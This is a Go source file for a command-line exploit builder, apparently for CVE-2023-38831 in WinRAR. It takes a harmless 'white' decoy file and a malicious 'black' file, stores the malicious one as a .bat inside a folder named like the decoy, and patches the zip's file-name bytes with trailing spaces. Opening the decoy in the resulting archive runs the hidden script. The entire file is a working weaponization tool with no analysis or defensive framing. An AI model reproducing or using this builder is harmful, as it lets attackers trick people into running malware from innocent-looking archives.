package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/spf13/cobra"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

const (
	LOGO = `
   _______    ________    ___   ____ ___  _____      _____ ____  ____ ________
  / ____/ |  / / ____/   |__ \ / __ \__ \|__  /     |__  /( __ )( __ )__  <  /
 / /    | | / / __/________/ // / / /_/ / /_ <______ /_ </ __  / __  |/_ </ / 
/ /___  | |/ / /__/_____/ __// /_/ / __/___/ /_____/__/ / /_/ / /_/ /__/ / / 
\____/  |___/_____/    /____/\____/____/____/     /____/\____/\____/____/_/ 
                                                              ---------help
                                                              -w "白文件名"
                                                              -b "恶意文件名"
                                                              -o "生成的压缩包名"
`
)

var (
	whiteFile    string
	blackFile    string
	outputFile   string
	tempDir      string
	newWhiteFile string
)

func init() {
	fmt.Println(LOGO)
	var rootCmd = &cobra.Command{}
	rootCmd.Flags().StringVarP(&whiteFile, "whiteFile", "w", "", "白文件")
	rootCmd.Flags().StringVarP(&blackFile, "blackFile", "b", "", "黑文件")
	rootCmd.Flags().StringVarP(&outputFile, "outputFile", "o", "", "输出的压缩包文件名")
	if err := rootCmd.Execute(); err != nil {
		log.Fatalf("[-] 解析命令行参数失败!")
	}
	if whiteFile == "" || blackFile == "" || outputFile == "" {
		log.Fatalf("键入的参数不全!!!")
	}

	whiteFile = strings.ReplaceAll(whiteFile, `.\`, "")
	blackFile = strings.ReplaceAll(blackFile, `.\`, "")
	outputFile = strings.ReplaceAll(outputFile, `.\`, "")

	tempDir = strings.Split(outputFile, ".")[0]
	newWhiteFile = fmt.Sprintf("%sB", whiteFile)
}

func main() {
	// 创建临时文件夹
	dirTree := fmt.Sprintf("%s/%s", tempDir, fmt.Sprintf("%sA", whiteFile))
	err := os.MkdirAll(dirTree, 0755) // 0755是文件夹权限，表示读写执行权限
	if err != nil {
		fmt.Println("Error creating folder:", err)
		return
	}

	// 移动白/黑文件到临时文件夹中
	copyAndRenameFile(whiteFile, fmt.Sprintf("./%s/%s", tempDir, newWhiteFile))
	copyAndRenameFile(blackFile, fmt.Sprintf("%s/%s .bat", dirTree, whiteFile))

	// 创建压缩包
	zipFolder(tempDir, outputFile)

	// 修正DirEntry.deFileName
	content, err := ioutil.ReadFile(outputFile)
	if err != nil {
		log.Fatal(err)
	}
	content = bytes.ReplaceAll(content, []byte(whiteFile+"A"), []byte(whiteFile+" "))
	content = bytes.ReplaceAll(content, []byte(whiteFile+"B"), []byte(whiteFile+" "))

	// 将修改的内容覆盖原文件
	err = ioutil.WriteFile(outputFile, content, 0644) // 将修改后的内容写入输出文件
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	os.RemoveAll(tempDir)

}

func copyAndRenameFile(sourcePath, destinationPath string) error {
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(destinationPath)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	return err
}

func addFileToZip(zipWriter *zip.Writer, file string, basePath string) error {
	// 打开文件
	srcFile, err := os.Open(file)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	// 获取文件信息
	fileInfo, err := srcFile.Stat()
	if err != nil {
		return err
	}

	// 创建zip文件中的文件头
	header, err := zip.FileInfoHeader(fileInfo)
	if err != nil {
		return err
	}

	// 修改文件头中的文件名，去掉basePath前缀
	relPath, err := filepath.Rel(basePath, file)
	if err != nil {
		return err
	}
	header.Name = relPath

	// 将文件头写入zip文件
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return err
	}

	// 将文件内容拷贝到zip文件中
	_, err = io.Copy(writer, srcFile)
	return err
}

func zipFolder(folderPath string, zipFilePath string) error {
	// 创建一个zip文件
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	// 创建zip.Writer
	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	// 遍历文件夹
	err = filepath.Walk(folderPath, func(file string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// 如果是目录，则不处理
		if info.IsDir() {
			return nil
		}

		// 将文件添加到zip文件中
		err = addFileToZip(zipWriter, file, folderPath)
		if err != nil {
			return err
		}

		return nil
	})

	return err
}
